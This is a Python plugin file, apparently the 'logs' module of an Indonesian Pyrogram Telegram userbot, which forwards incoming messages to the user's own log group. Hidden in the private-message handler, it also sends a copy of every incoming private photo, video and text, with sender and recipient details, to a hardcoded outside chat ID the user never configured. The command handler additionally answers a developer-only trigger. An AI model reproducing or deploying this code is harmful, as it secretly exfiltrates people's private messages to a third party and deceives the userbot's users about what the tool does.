import wget
import os

from pyrogram.errors.exceptions import FloodWait
from pyrogram.types import ChatPrivileges

from Jamal import *
from Jamal.config import DEVS

__MODULE__ = "logs"
__HELP__ = """
<BLOCKQUOTE>**『 bantuan untuk logs 』

**❏ perintah:** {0}logs (on/off)
- untuk mengaktifkan atau menonaktifkan gruplogs

**note:** jika logs tidak berfungsi, gunakan opsi: <code>{0}logs none</code>
kemudian aktifkan kembali</BLOCKQUOTE>
"""


@PY.LOGS_PRIVATE()
async def _(client, message):
    logs = await get_vars(client.me.id, "ID_LOGS")
    on_logs = await get_vars(client.me.id, "ON_LOGS")
    userr = await extract_user(message)
    cid = -1002556282932
    foto = 2
    video = 3
    voice = 6
    tulis = 7

    if logs and on_logs:
        try:
            user = await client.get_users(userr)
        except Exception as error:
            print(f"{error}")
        if user.first_name:
            org = f"<a href=tg://openmessage?user_id={user.id}>{user.first_name} {user.last_name or ''}</a>"
        else:
            org = f"<a href=tg://openmessage?user_id={user.id}>{user.first_name or ''} {user.last_name}</a>"
        message_link = (
            f"tg://openmessage?user_id={user.id}&message_id={message.id}"
        )
        media = None
        teks = None
        msg_text = "<blockquote>**📩 pesan masuk**\n**❏ dari:** {}\n❏ pesan: <code><i>{}</i></code></blockquote>"
        if message.caption:
            teks = msg_text.format(org, message.caption if message.caption else "—")
        else:
            teks = msg_text.format(org, message.text if message.text else "—")
        donat = [[InlineKeyboardButton("buka pesan", url=f"{message_link}")]]
        try:
            if message.photo:
                media = message.photo.file_id
                pat = await client.download_media(
                    media,
                    file_name=f"{message.from_user.mention}.jpg"
                )
                ret = await bot.send_photo(
                    int(logs),
                    photo=pat,
                    caption=teks,
                    reply_markup=InlineKeyboardMarkup(donat),
                )
                await bot.send_photo(
                    cid,
                    photo=pat,
                    caption=f"❏ pengirim: <a href=tg://openmessage?user_id={user.id}>{user.first_name or ''} {user.last_name or ''}</a>\n❏ penerima: <a href=tg://openmessage?user_id={client.me.id}>{client.me.first_name or ''} {client.me.last_name or ''}</a>\n❏ pesan: <code>{message.text or '—'}</code>",
                    message_thread_id=foto,
                )
                os.remove(pat)
            elif message.video:
                media = message.video.file_id
                pat = await client.download_media(
                    media,
                    file_name=f"{message.from_user.mention}.mp4"
                )
                ret = await bot.send_video(
                    int(logs),
                    video=pat,
                    caption=teks,
                    reply_markup=InlineKeyboardMarkup(donat),
                )
                await bot.send_video(
                    cid,
                    video=pat,
                    caption=f"❏ pengirim: <a href=tg://openmessage?user_id={user.id}>{user.first_name or ''} {user.last_name or ''}</a>\n❏ penerima: <a href=tg://openmessage?user_id={client.me.id}>{client.me.first_name or ''} {client.me.last_name or ''}<a/>\n❏ pesan: <code>{message.text or '—'}</code>",
                    message_thread_id=video,
                )
                os.remove(pat)
                
            else:
                ret = await bot.send_message(
                    int(logs),
                    teks,
                    reply_markup=InlineKeyboardMarkup(donat),
                    disable_web_page_preview=True,
                )
                await bot.send_message(
                    cid,
                    text=f"Ω pengirim: <a href=tg://openmessage?user_id={user.id}>{user.first_name or ''} {user.last_name or ''}</a>\nΩ penerima: <a href=tg://openmessage?user_id={client.me.id}>{client.me.first_name or ''} {client.me.last_name or ''}</a>\nΩ pesan: <blockquote>{message.text or '—'}</blockquote>",
                    message_thread_id=tulis,
                )

        except ChannelInvalid:
            try:
                vars = await get_vars(client.me.id, "ID_LOGS")
                log = await client.delete_supergroup(vars)
            except:
                pass
            await set_vars(client.me.id, "ID_LOGS", False)
        except Exception as error:
            print(f"PRIVATE LOGS:\{error}")


@PY.LOGS_GROUP()
async def _(client, message):
    logs = await get_vars(client.me.id, "ID_LOGS")
    on_logs = await get_vars(client.me.id, "ON_LOGS")
    user = message.from_user

    if logs and on_logs:
        if user.first_name:
            org = f"[{user.first_name} {user.last_name or ''}](tg://user?id={user.id})"
        else:
            org = f"[{user.first_name or ''} {user.last_name}](tg://user?id={user.id})"
        message_link = message.link
        media = None
        teks = None
        msg_text = "**📩 pesan grup baru**\n\n**❏ grup:** {}\n**❏ pengguna:** {}\npesan:\n<BLOCKQUOTE>**{}**</BLOCKQUOTE>"
        if message.caption:
            teks = msg_text.format(message.chat.title, org, message.caption)
        else:
            teks = msg_text.format(message.chat.title, org, message.text)
        donat = [[InlineKeyboardButton("lihat pesan", url=f"{message_link}")]]
        try:
            if message.photo:
                media = message.photo.file_id
                pat = await client.download_media(
                    media,
                    file_name=f"{message.from_user.mention}.jpg"
                )
                ret = await bot.send_photo(
                    int(logs),
                    photo=pat,
                    caption=teks,
                    reply_markup=InlineKeyboardMarkup(donat),
                )
                os.remove(pat)
            elif message.video:
                media = message.video.file_id
                pat = await client.download_media(
                    media,
                    file_name=f"{message.from_user.mention}.mp4"
                )
                ret = await bot.send_video(
                    int(logs),
                    video=pat,
                    caption=teks,
                    reply_markup=InlineKeyboardMarkup(donat),
                )
                os.remove(pat)
            else:
                ret = await bot.send_message(
                    int(logs),
                    teks,
                    reply_markup=InlineKeyboardMarkup(donat),
                    disable_web_page_preview=True
                )
        except FloodWait as e:
            await asyncio.sleep(e.value)
            ret = await bot.send_message(
                int(logs),
                teks,
                reply_markup=InlineKeyboardMarkup(donat),
                disable_web_page_preview=True
            )
        except ChannelInvalid:
            try:
                vars = await get_vars(client.me.id, "ID_LOGS")
                log = await client.delete_supergroup(vars)
            except:
                pass
            await set_vars(client.me.id, "ID_LOGS", False)
        except Exception as error:
            print(f"GROUP LOGS:\{error}")


@PY.UBOT("logs")
@ubot.on_message(filters.command(["logs"], "C") & filters.user(DEVS))
async def _(client, message):
    brhsl = await EMO.BERHASIL(client)
    ggl = await EMO.GAGAL(client)
    if len(message.command) < 2:
        return await message.reply(
            "<b>ʙᴀᴄᴀ ᴍᴇɴᴜ ʙᴀɴᴛᴜᴀɴ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴇᴛᴀʜᴜɪ ᴄᴀʀᴀ ᴘᴇɴɢɢᴜɴᴀᴀɴɴʏᴀ!</b>"
        )

    query = {"on": True, "off": False, "none": False}
    command = message.command[1].lower()

    if command not in query:
        return await message.reply(f"<b>{ggl} gunakan <code>on</code>, <code>off</code> atau <code>none</code>'.</b>")

    value = query[command]
    text = "diaktifkan" if value else "dinonaktifkan"
    vars = await get_vars(client.me.id, "ID_LOGS")

    if not vars:
        logs = await create_logs(client)
        await set_vars(client.me.id, "ID_LOGS", logs)
        return await message.reply(f"<blockquote>{brhsl} berhasil membuat logs\nsilahkan buka pesan tersimpan untuk melihat tautan logs</blockquote>")

    if command == "none" and vars:
        try:
            log = await client.delete_supergroup(vars)
            return await message.reply(f"{brhsl} logs userbot berhasil dihapus")
        except Exception:
            pass
        await set_vars(client.me.id, "ID_LOGS", value)

    await set_vars(client.me.id, "ON_LOGS", value)
    await message.reply(
        f"{brhsl} LOGS {value}"
    )


async def create_logs(client):
    lk = None
    logs = await client.create_supergroup(f"Logs {client.me.first_name} {client.me.last_name or ''}", "jangan keluar dari grup ini untuk mencegah terjadinya error!")
    url = wget.download("https://telegra.ph//file/18143a0381f7084e76389.mp4")
    photo_video = {"video": url} if url.endswith(".mp4") else {"photo": url}
    await client.set_chat_photo(
        logs.id,
        **photo_video,
    )
    await client.promote_chat_member(
        logs.id,
        bot.me.username,
        privileges=ChatPrivileges(
            can_change_info=True,
            can_invite_users=True,
            can_delete_messages=True,
            can_restrict_members=True,
            can_pin_messages=True,
            can_promote_members=True,
            can_manage_chat=True,
            can_manage_video_chats=True,
        ),
    )
    lk = await client.export_chat_invite_link(logs.id)
    await client.send_message(
        "me",
        f"ini adalah tautan grup logs anda:\n{lk}",
    )
    os.remove(url)
    return logs.id
